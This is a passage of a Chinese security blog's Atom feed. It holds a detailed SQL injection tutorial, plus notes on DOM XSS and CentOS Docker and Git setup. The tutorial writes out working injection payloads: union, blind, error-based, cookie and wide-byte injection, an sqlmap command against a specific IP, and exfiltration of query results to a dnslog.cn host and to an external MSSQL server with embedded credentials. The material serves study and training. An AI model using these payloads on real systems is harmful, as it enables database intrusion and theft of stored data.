DOM型XSS</h2><p>DOM就是通过JS操作浏览器。通过JS处理后才产生的XSS</p><p>页面：动态页面、静态页面 （伪静态）</p><p>伪静态：动态页面伪装成静态，让黑客不来攻击。静态页面无法达成厉害的攻击</p><p>document.write()</p><p>document.cookie</p>]]></content>
    
    
    <summary type="html">XSS</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-03-24T07:53:00.000Z</published>
    <updated>2021-04-07T03:29:39.738Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SQL注入原理"><a href="#0x01-SQL注入原理" class="headerlink" title="0x01 SQL注入原理"></a>0x01 SQL注入原理</h2><p>用户输入的数据被当作代码执行</p><h2 id="0x02-基本手工注入流程-联合注入、GET注入、POST注入"><a href="#0x02-基本手工注入流程-联合注入、GET注入、POST注入" class="headerlink" title="0x02 基本手工注入流程(联合注入、GET注入、POST注入)"></a>0x02 基本手工注入流程(联合注入、GET注入、POST注入)</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字型：<span class="attribute">id</span>=2-1、and <span class="attribute">1</span>=1、and <span class="attribute">1</span>=2、and <span class="attribute">-1</span>=-2、and 1&gt;0、<span class="keyword">or</span> <span class="attribute">1</span>=1 <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">字符型：<span class="string">&#x27;、&#x27;</span>)、<span class="string">&#x27;))、)、&quot;、&quot;)、&quot;))</span></span><br><span class="line"><span class="string">注释符：-- qwe、/**/、#    // 当是字符型的时候需要注释</span></span><br></pre></td></tr></table></figure><h3 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="title">by</span> n</span><br></pre></td></tr></table></figure><h3 id="查看回显点"><a href="#查看回显点" class="headerlink" title="查看回显点"></a>查看回显点</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......,n</span><br></pre></td></tr></table></figure><h3 id="查看数据库名称-假设n是回显点"><a href="#查看数据库名称-假设n是回显点" class="headerlink" title="查看数据库名称(假设n是回显点)"></a>查看数据库名称(假设n是回显点)</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......,database()</span><br></pre></td></tr></table></figure><h3 id="查看表名"><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......,table_name from information_schema.tables where table_schema = database() limit <span class="number">0</span>,<span class="number">1</span>    // limit <span class="number">0</span>,<span class="number">1</span> <span class="number">0</span>是从哪开始,<span class="number">1</span>是显示几个</span><br></pre></td></tr></table></figure><h3 id="查看字段名"><a href="#查看字段名" class="headerlink" title="查看字段名"></a>查看字段名</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema = <span class="keyword">database</span>() <span class="keyword">and</span> table_name = <span class="string">&#x27;表名&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......,字段名 from 表名 limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="0x03-盲注-布尔盲注、延时盲注"><a href="#0x03-盲注-布尔盲注、延时盲注" class="headerlink" title="0x03 盲注(布尔盲注、延时盲注)"></a><strong>0x03 盲注(布尔盲注、延时盲注)</strong></h2><p>在使用and 1=1 和 and 1=2时发现可能存在注入，但是并没有回显点的时候可以尝试使用布尔盲注。</p><p>当使用and 1=1 和 and 1=2时发现都出现正确页面，可能存在延时盲注，需要进一步测试</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ol><li>length()</li></ol><p>返回字符串的长度</p><ol start="2"><li>substr()</li></ol><p>截取字符串。语法：substr(str,pos,len)</p><ol start="3"><li>ascii()</li></ol><p>返回字符的ascii码【将字符变为数字】</p><ol start="4"><li>sleep()</li></ol><p>将程序挂起一段时间n，n为n秒</p><ol start="5"><li>if(expr1,expr2,expr3)</li></ol><p>判断语句：如果第一个语句正确就执行第二个语句，否则就执行第三个语句</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ol><li>猜解当前数据库名称长度</li></ol><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">and</span></span> (<span class="function"><span class="title"><span class="built_in">length</span></span>(<span class="title">database</span>()))&gt;<span class="number">9</span></span></span><br></pre></td></tr></table></figure><ol start="2"><li>利用ASCII码猜解当前数据库名称</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> (ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">115</span>   // 返回正常，说明数据库名称第一位是s</span><br><span class="line"><span class="attribute">and</span> (ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>)))=<span class="number">101</span>    // 返回正常，说明数据库名称第二位是e</span><br></pre></td></tr></table></figure><ol start="3"><li>猜表名</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (ascii((substr(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">101</span>    // 返回正常，说明数据表名的第一个第一位是e</span><br></pre></td></tr></table></figure><ol start="4"><li>猜字段名</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;表名&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">102</span>    // 返回正常，说明表中的列名称第一位是f</span><br></pre></td></tr></table></figure><ol start="5"><li>猜内容</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> (ascii(substr((select 字段名 from 表名 limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">122</span>    // 返回正常，说明表中列第一位是z</span><br></pre></td></tr></table></figure><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>与布尔盲注类似，当注入后无论如何都没有变化时尝试，放在if()函数里面进行，通过有无延时判断是否正确</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="name">length</span>(<span class="name">database</span>()))&gt;n,sleep(<span class="number">10</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-宽字节注入"><a href="#0x04-宽字节注入" class="headerlink" title="0x04 宽字节注入"></a><strong>0x04 宽字节注入</strong></h2><h3 id="PHP的防御函数"><a href="#PHP的防御函数" class="headerlink" title="PHP的防御函数"></a>PHP的防御函数</h3><p>magic_quotes_gpc(魔术引号开关)使数据库无法闭合注入，PHP5.4以上取消了魔术引号，后续版本有类似功能的函数</p><p>这个函数的作用是在PHP中判断解析用户提交的数据，如果有post、get、cookie过来的数据就加上转义字符“\”，来确保这些数据不会引起程序特别是数据库因为特殊字符引起的污染而出现致命的错误。</p><p>单引号、双引号、反斜线与NULL等字符都会被加上反斜线</p><h3 id="遇到了魔术引号"><a href="#遇到了魔术引号" class="headerlink" title="遇到了魔术引号"></a>遇到了魔术引号</h3><ol><li>寻找不需要闭合的注入点</li><li>使用宽字节注入</li></ol><p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码，那么就有可能产生宽字节注入</p><p>发现输入’注释时有\将之转义，这时在前面加一个%df可以将\合起来变成一个汉字，从而达到注释的效果。</p><p>通过16进制，子查询或者函数来替换有单引号的地方</p><ol><li>GET注入中在闭合符号前加上%df</li><li>POST注入中在闭合符号前加上汉字</li><li>修改brupsuite的hex中对应数的16进制值</li></ol><h2 id="0x05-报错注入-HEAD注入"><a href="#0x05-报错注入-HEAD注入" class="headerlink" title="0x05 报错注入(HEAD注入)"></a><strong>0x05 报错注入(HEAD注入)</strong></h2><h3 id="TIPS：只有知道账户密码的时候可用"><a href="#TIPS：只有知道账户密码的时候可用" class="headerlink" title="TIPS：只有知道账户密码的时候可用"></a><strong>TIPS：只有知道账户密码的时候可用</strong></h3><h3 id="PHP全局变量——超全局变量"><a href="#PHP全局变量——超全局变量" class="headerlink" title="PHP全局变量——超全局变量"></a>PHP全局变量——超全局变量</h3><p>PHP中的许多预定义变量都是”超全局的”，这意味着它们在一个脚本的全部脚本域中都可以使用。</p><p>超全局变量：</p><ul><li>$_REQUEST(获取GET/POST/COOKIE)COOKIE在PHP5.4版本以上已经无法获取了</li><li>$_POST(获取POST传参)</li><li>$_GET(获取GET的传参)</li><li>$_COOKIE(获取COOKIE的值)</li><li>$_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)功能强大</li></ul><p>常用的：</p><ul><li>$_SERVER[‘HTTP_REFERER’] 获取Referer请求头数据</li><li>$_SERVER[“HTTP_USER_AGENT”] 获取用户相关信息，包括用户浏览器、操作系统等信息</li><li>$_SERVER[“REMOTE_ADDR”] 浏览网页的用户IP</li></ul><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p>updatexml()更新xml文档的函数</p><p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(SELECT database()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>)</span><br><span class="line"><span class="attribute">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(SELECT table_name from information_schema.tables where table_schema = database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>)</span><br><span class="line"><span class="attribute">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(SELECT column_name from information_schema.columns where table_schema = database() and table_name = &#x27;表名&#x27; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>)</span><br><span class="line"><span class="attribute">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(SELECT 字段名 from 表名 limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><ol><li>0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x  0x7e是一个特殊符号，然后不符合路径规则报错</li><li>有时可以在请求头中加上X-Forwarded-For: 进行注入</li></ol><h2 id="0x06-Cookie注入"><a href="#0x06-Cookie注入" class="headerlink" title="0x06 Cookie注入"></a>0x06 Cookie注入</h2><h3 id="and等字符被拦截的情况下，asp、aspx、php-lt-5-4-45可用"><a href="#and等字符被拦截的情况下，asp、aspx、php-lt-5-4-45可用" class="headerlink" title="and等字符被拦截的情况下，asp、aspx、php&lt;=5.4.45可用"></a>and等字符被拦截的情况下，asp、aspx、php&lt;=5.4.45可用</h3><p>开发滥用$_REQUEST引起的，使用Cookie注入需要URL编码</p><p>在开发者工具中找到Cookie设置ID和值，再将get传参的?id=1删去，发现还是可以正常访问，说明存在Cookie注入。</p><h3 id="设置Cookie，需要URL编码"><a href="#设置Cookie，需要URL编码" class="headerlink" title="设置Cookie，需要URL编码"></a>设置Cookie，需要URL编码</h3><ol><li>按F12，在浏览器中修改Cookie</li><li>使用BrupSuite抓包修改Cookie，在后面加上; id=171发现和get传参的结果一样</li><li>通过Js，document.cookie=”id=”+escape(“171 order by 1”)</li></ol><p>Access查询必须后带表名，而一开始并不知道表名，union select 1,2,3,4 from 表名，这时有两个办法解决：</p><ul><li>查询系统自带库【MySQL MsSQL Oracle】都可以这样做，但是Access是淘汰的数据库，所以没办法，只能用第二个办法</li><li>强猜 admin news user job,但是Access数据库在使用union select时可能会出错，所以一般使用 and exists (select*from 表名)判断表名，可以利用BurpSuite跑字典跑出表名</li></ul><p>之后要查出表内内容有两个办法：</p><ul><li>强猜，猜测表内有什么字段</li><li>偏移注入</li></ul><h3 id="sqlmap跑Cookie注入"><a href="#sqlmap跑Cookie注入" class="headerlink" title="sqlmap跑Cookie注入"></a>sqlmap跑Cookie注入</h3><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap</span>.<span class="string">py</span> -<span class="string">u</span> <span class="string">&quot;http://59.63.200.79:8004/shownews.asp&quot;</span> <span class="built_in">--cookie</span> <span class="string">&quot;id=171&quot;</span> <span class="built_in">--level</span> <span class="string">2</span></span><br></pre></td></tr></table></figure><h2 id="0x07-偏移注入"><a href="#0x07-偏移注入" class="headerlink" title="0x07 偏移注入"></a>0x07 偏移注入</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>在SQL注入的时候会碰到一些无法查询列名的情况，比如</p><ul><li>系统自带数据库的权限不够而无法访问系统自带库。</li><li>当猜到表名但是无法猜到字段名的时候，可以使用偏移注入来查询表里的数据。</li></ul><p>表名.<em>：</em>在数据库中代表一切；.代表向下</p><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">admin</span>.* <span class="keyword">from</span> <span class="keyword">admin</span>    // 放在不同的回显点显示不同的字段的内容，回显点包含在<span class="keyword">admin</span>.*内</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">admin</span>.*,<span class="number">10</span> <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><h2 id="0x08-DNS注入"><a href="#0x08-DNS注入" class="headerlink" title="0x08 DNS注入"></a>0x08 DNS注入</h2><h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>无法直接利用漏洞获得回显，但是目标可以发起请求，此时就可以通过DNS请求的方法将想获得的数据外带出来。</p><p>核心：将盲注转化为显错注入</p><p>MySQL必须打开<code>secure_file_priv= </code> </p><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p>load_file()读取文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load<span class="constructor">_file(&#x27;<span class="operator">/</span><span class="operator">/</span><span class="params">error</span>.1806dl.<span class="params">dnslog</span>.<span class="params">cn</span><span class="operator">/</span><span class="params">bc</span>&#x27;)</span>;</span><br><span class="line">select load<span class="constructor">_file(<span class="params">concat</span>(&#x27;<span class="operator">/</span><span class="operator">/</span>&#x27;,(<span class="params">select</span> <span class="params">database</span>()</span>),&#x27;.<span class="number">1806</span>dl.dnslog.cn/bc&#x27;));</span><br></pre></td></tr></table></figure><p>dnslog.cn   // 网站</p><h2 id="0x9-反弹注入"><a href="#0x9-反弹注入" class="headerlink" title="0x9 反弹注入"></a><strong>0x9 反弹注入</strong></h2><h3 id="使用场景-2"><a href="#使用场景-2" class="headerlink" title="使用场景"></a>使用场景</h3><p>页面没东西显示的盲注</p><p>明明是SQL的注入点却无发进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决这些问题，比较好的解决方法是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数。</p><p>反弹注入就是把查询出来的数据发送到我们的MSSQL数据库上，此时就需要自己的MSSQL数据库和一个公网IP。</p><h3 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h3><ol><li>猜字段</li><li>联合查询，要写union all select</li><li>输出点要用null填充</li><li>注释只有–+</li><li>sysobjects查询系统表 union all select id,name,null from sysobjects where xtype =U –+</li><li>syscolumns字段 union all select id,name,null from syscolumns where id=id –+</li><li>查询信息 union all select id,passwd,token from admin –+</li></ol><h3 id="反弹注入"><a href="#反弹注入" class="headerlink" title="反弹注入"></a>反弹注入</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">&#x27;sqloledb&#x27;</span>,<span class="string">&#x27;server=den1.mssql8.gear.host,1433;uid=xyzxyz;pwd=Ct27!_nXWji4;database=xyzxyz&#x27;</span>).xyzxyz.dbo.test <span class="keyword">select</span> * <span class="keyword">from</span> admin --</span><br></pre></td></tr></table></figure><h2 id="0x10-报错注入"><a href="#0x10-报错注入" class="headerlink" title="0x10 报错注入"></a>0x10 报错注入</h2><h3 id="Orcale可用"><a href="#Orcale可用" class="headerlink" title="Orcale可用"></a>Orcale可用</h3><p>dual是一个虚表，直接查询他只显示一个X，列名为dummy</p><p>dual实际上是为了满足查询语句的结构产生的</p><p>查询用户名：select user from dual</p><p>调用系统函数：(获得随机值：select dbms_random.random from dual)</p><p>做加减法： select 9+1 from dual</p><p>查询出所有的表：union all select * from all_tables</p><p>查询出当前用户的表：select * from user_tables</p><p>查询出所有的字段：select * from all_tab_columns</p><p>查询出当前用户的字段：select * from user_tab_columns</p><p>查版本：select * from v$version</p><p>rownum=1 (限制查询返回的总行数为一条)</p><p>Oracle中&lt;&gt;和!=都是不等于</p><p>to_nchar()转换进制</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>不用管有没有输出点</p><p>不用管数据类型</p><p>不用管字段数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctxsys.drithsx.sn(<span class="keyword">user</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> v$<span class="keyword">version</span> <span class="keyword">where</span> rownum = <span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>查询关于主题的对应关键词，然后因为查询失败爆出想要查询的内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum=<span class="number">1</span> <span class="keyword">and</span> <span class="built_in">table_name</span>&lt;&gt;<span class="string">&#x27;NEWS&#x27;</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SQL注入</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>纲要</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/%E7%BA%B2%E8%A6%81/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/%E7%BA%B2%E8%A6%81/</id>
    <published>2021-03-24T07:52:04.000Z</published>
    <updated>2021-03-24T07:52:52.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识面，决定看到的攻击面有多广。"><a href="#知识面，决定看到的攻击面有多广。" class="headerlink" title="知识面，决定看到的攻击面有多广。"></a>知识面，决定看到的攻击面有多广。</h2><h2 id="知识链，决定发动的杀伤链有多深。"><a href="#知识链，决定发动的杀伤链有多深。" class="headerlink" title="知识链，决定发动的杀伤链有多深。"></a>知识链，决定发动的杀伤链有多深。</h2><h2 id="从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题"><a href="#从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题" class="headerlink" title="从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:"></a>从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题:</h2><ul><li>这个方向上最新进展是什么？ 都知道吗？</li><li>这个方向上最著名的专家有哪些？他们的研究都看过吗？</li><li>这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？</li><li>这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？</li></ul>]]></content>
    
    
    <summary type="html">学习方向</summary>
    
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web安全" scheme="http://yunhenlxx.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CentOS8下安装Docker</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E5%AE%89%E8%A3%85Docker/</id>
    <published>2021-03-24T07:39:36.000Z</published>
    <updated>2021-03-24T07:50:44.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-使用存储库安装"><a href="#0x01-使用存储库安装" class="headerlink" title="0x01 使用存储库安装"></a>0x01 使用存储库安装</h2><h3 id="设置存储库"><a href="#设置存储库" class="headerlink" title="设置存储库"></a>设置存储库</h3><p>安装yum-utils软件包并设置<strong>稳定的</strong>存储库。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install -y yum-utils</span><br><span class="line">$ sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/docker-ce/</span>linux<span class="regexp">/centos/</span>docker-ce.repo</span><br></pre></td></tr></table></figure><h3 id="安装Docker引擎"><a href="#安装Docker引擎" class="headerlink" title="安装Docker引擎"></a>安装Docker引擎</h3><p>安装<em>最新版本</em>的Docker Engine和容器：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install docker-<span class="keyword">ce</span> docker-<span class="keyword">ce</span>-cli containerd.io</span><br></pre></td></tr></table></figure><p>如果提示接受GPG密钥，验证指纹是否匹配 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35，如果是，则接受。</p><h3 id="启动并设置开机运行Docker"><a href="#启动并设置开机运行Docker" class="headerlink" title="启动并设置开机运行Docker"></a>启动并设置开机运行Docker</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> sudo systemctl <span class="built_in">start</span> docker</span><br><span class="line"><span class="variable">$</span> sudo systemctl enable docker</span><br></pre></td></tr></table></figure><h3 id="升级Docker引擎"><a href="#升级Docker引擎" class="headerlink" title="升级Docker引擎"></a>升级Docker引擎</h3><p>重新安装一下即可</p><h2 id="0x02-配置镜像加速器"><a href="#0x02-配置镜像加速器" class="headerlink" title="0x02 配置镜像加速器"></a>0x02 配置镜像加速器</h2><p>首先执行以下命令，查看是否在 docker.service 文件中配置过镜像地址</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> systemctl <span class="built_in">cat</span> docker | grep <span class="string">&#x27;\-\-registry\-mirror&#x27;</span></span><br></pre></td></tr></table></figure><p>如果以上命令没有任何输出，那么就可以在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在新建该文件）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新启动服务</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo systemctl daemon-reload</span><br><span class="line"><span class="variable">$ </span>sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>使用<code>docker info</code> 查看是否配置成功</p>]]></content>
    
    
    <summary type="html">CentOS8下安装Docker</summary>
    
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/tags/Linux/"/>
    
    <category term="Docker" scheme="http://yunhenlxx.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CentOS8下安装Git</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E5%AE%89%E8%A3%85Git/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E5%AE%89%E8%A3%85Git/</id>
    <published>2021-03-24T07:38:16.000Z</published>
    <updated>2021-03-24T07:38:48.360Z</updated>
    
    <content type="html"><![CDATA[<p>一行命令即可</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum <span class="keyword">install</span> git-core</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CentOS8下安装Git</summary>
    
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="http://yunhenlxx.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CentOS8下安装Node.js和npm</title>
    <link href="http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E5%AE%89%E8%A3%85Node-js%E5%92%8Cnpm/"/>
    <id>http://yunhenlxx.github.io/2021/03/24/CentOS8%E4%B8%8B%E5%AE%89%E8%A3%85Node-js%E5%92%8Cnpm/</id>
    <published>2021-03-24T07:37:29.000Z</published>
    <updated>2021-03-24T07:37:52.428Z</updated>
    
